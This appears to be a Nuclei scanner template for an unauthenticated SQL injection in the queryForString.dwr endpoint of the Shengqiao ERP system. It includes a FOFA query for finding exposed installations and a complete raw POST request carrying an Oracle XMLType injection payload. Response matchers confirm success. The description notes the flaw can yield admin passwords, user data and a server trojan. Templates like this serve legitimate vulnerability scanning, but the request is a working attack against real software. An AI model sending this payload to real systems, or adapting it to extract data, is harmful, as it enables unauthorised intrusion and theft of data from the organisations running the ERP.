id: shengqiaoERP-queryForString_dwr-sql
info:
  name: 圣乔ERP系统 queryForString.dwr SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: title="圣乔ERP系统"
    圣乔ERP系统 NamedParameterSingleRowQueryConvertor.queryForString.dwr 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s/1iQAnHBLt8G6mFHxEtPmiQ?token=1543860814&lang=zh_CN
  tags: sql injection



http:
  - raw:
      - |
        POST /erp/dwr/call/plaincall/NamedParameterSingleRowQueryConvertor.queryForString.dwr HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Content-Type: application/x-www-form-urlencoded; charset=utf-8
        Connection: close

        c0-id=0
        batchId=0
        callCount=1
        c0-param1=Object_Object:{}
        page=/erp/dwr/test/NamedParameterSingleRowQueryConvertor
        httpSessionId=47CA299619667847F1BB450454E6C2D4
        scriptSessionId=F3F037EB7A5102043AD4CEB47EB17A7275
        c0-scriptName=NamedParameterSingleRowQueryConvertor
        c0-methodName=queryForString
        c0-param0=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(122)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (99=99) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(122)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'qjzzq1qvzvq'
      - type: status
        status: 
          - 200
